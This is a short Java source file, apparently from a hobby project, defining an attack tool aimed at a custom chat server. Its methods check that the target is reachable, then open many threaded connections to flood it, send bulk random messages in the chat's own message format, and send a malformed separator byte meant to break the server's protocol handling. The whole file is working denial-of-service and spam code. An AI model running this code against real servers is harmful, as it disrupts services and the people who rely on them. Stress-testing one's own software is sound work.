package java_chat_hax0r;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;

import java_chat_hax0r.utils.RandomString;

public class Hax0rTool
{
	private String ip;
	private int port;
	
	public boolean connect(String ip, int port) {
		this.ip = ip;
		this.port = port;
		try {
			Socket dummy = new Socket();
			dummy.connect(new InetSocketAddress(ip, port),  1000);
			dummy.close();
	        return true;
	    } catch (IOException ignored) {
	        return false;
	    }
	}
	
	public void dos(int amount) {
		for (int i = 0; i < amount; i++) {
			new Thread() {
				@Override
				public void run() {
					try (Socket dummy = new Socket(ip, port)) {
						dummy.setKeepAlive(true);
					} catch (Exception ignored) {}
				}
			}.start();
		}
	}
	
	public void spam(int amount) {
		try (Socket client = new Socket(ip, port)) {
			ObjectOutputStream out = new ObjectOutputStream(client.getOutputStream());
			for (int i = 0; i < amount; i++) {
				out.writeUTF("TSP" + System.currentTimeMillis() + "\u001eMSG" + RandomString.getRandomString());
				out.flush();
			}
		} catch (Exception ignored) {}
	}
	
	public void protocolAttack() {
		try (Socket client = new Socket(ip, port)) {
			ObjectOutputStream out = new ObjectOutputStream(client.getOutputStream());
			out.writeUTF("\u001e");
			out.flush();
		} catch (Exception ignored) {}
	}
}